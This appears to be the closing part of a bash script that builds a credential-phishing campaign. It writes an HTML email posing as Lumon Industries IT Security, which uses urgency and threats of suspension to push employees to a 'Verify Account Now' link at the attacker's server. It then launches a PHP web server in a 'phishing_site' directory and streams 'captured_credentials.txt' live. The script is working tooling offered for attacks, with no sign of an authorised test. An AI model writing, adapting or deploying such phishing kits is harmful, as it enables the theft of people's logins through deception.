                <img src="https://via.placeholder.com/180x60?text=Lumon+Industries" alt="Lumon Industries" width="180" style="display: block;">
            </td>
        </tr>
        
        <!-- CONTENT AREA -->
        <tr>
            <td bgcolor="#ffffff" style="padding: 40px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
                            Urgent: Security Alert - Immediate Action Required
                        </td>
                    </tr>
                    <tr>
                        <td style="padding: 20px 0;">
                            <p>Dear Valued Employee,</p>
                            
                            <p>The IT Security department has detected multiple unauthorized access attempts on your company account. According to our logs, these attempts originated from an unrecognized device.</p>
                            
                            <p>As part of our updated security protocols, <strong>you must verify your account credentials within the next 24 hours</strong> to maintain access to all Lumon Industries systems.</p>
                            
                            <p>This verification is mandatory according to our new company-wide security policy.</p>
                        </td>
                    </tr>
                    <tr>
                        <td align="center" style="padding: 30px 0;">
                            <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" bgcolor="#003366" style="border-radius: 4px;">
                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact the IT Security team at security@mail.lumoninc.com.</p>
                            
                            <p>Failure to verify your account within the specified timeframe may result in temporary account suspension until proper identity verification can be completed.</p>
                            
                            <p>Thank you for your prompt attention to this matter.</p>
                            
                            <p>Regards,<br>
                            Lumon Industries IT Security Team</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        
        <!-- FOOTER -->
        <tr>
            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #666666; font-size: 12px;">
                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
                            <p>&copy; 2023 Lumon Industries. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
EOF
fi

# Start PHP server and monitor for credentials in one step
echo -e "${GREEN}[STATUS]${NC} Starting the phishing web server with real-time credential capture..."
echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."

# Use a signal trap to clean up child processes when the script is terminated
trap 'kill $(jobs -p) 2>/dev/null' EXIT

cd phishing_site

# Create an empty credentials file if it doesn't exist
touch captured_credentials.txt

# Display real-time credentials 
tail -f captured_credentials.txt 2>/dev/null &

# Start PHP server (will run until Ctrl-C)
if [ "$EUID" -eq 0 ]; then
    # Running as root, try port 80
    php -S 0.0.0.0:80
else
    # Not running as root, suggest sudo
    echo -e "${YELLOW}[WARNING]${NC} Not running as root. For port 80, run with: sudo $0"
    echo -e "${YELLOW}[INFO]${NC} Using fallback port 8080..."
    php -S 0.0.0.0:8080
fi 